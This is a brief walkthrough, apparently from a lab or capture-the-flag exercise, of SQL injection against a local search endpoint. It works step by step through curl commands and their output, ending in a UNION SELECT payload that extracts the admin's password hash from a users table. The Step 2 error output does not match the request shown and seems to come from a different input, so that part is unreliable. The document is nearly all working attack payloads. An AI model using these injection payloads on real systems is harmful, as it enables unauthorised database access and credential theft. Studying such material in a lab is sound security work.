# Finding the Bug

## Step 1: Probe the search endpoint

```
curl -s "http://127.0.0.1:8114/search?q=admin"
```

Output:

```json
{"results":[{"id":1,"role":"admin","username":"admin"}]}
```

Normal results. The endpoint accepts a `q` parameter and returns matching users.

## Step 2: Test for SQL injection

Try a single quote to break the query:

```
curl -s "http://127.0.0.1:8114/search?q='"
```

Output:

```json
{"error":"unrecognized token: \"'admin'%'\""}
```

The raw SQL error confirms injection. The input lands directly in the query.

## Step 3: Determine the number of columns

The original query selects three columns: id, username, role. A UNION SELECT must match. Test with:

```
curl -s "http://127.0.0.1:8114/search?q=' UNION SELECT 1,2,3 --"
```

Output includes a row with id=1, username=2, role=3. Three columns confirmed.

## Step 4: Extract the password hash

Replace the placeholder values with the target column:

```
curl -s "http://127.0.0.1:8114/search?q=' UNION SELECT 1, password_hash, role FROM users WHERE role='admin' --"
```

Output:

```json
{"results":[{"id":1,"role":"admin","username":"482c811da5d5b4bc6d497ffa98491e38"}]}
```

The hash appears in the "username" field. That is the admin's password hash.
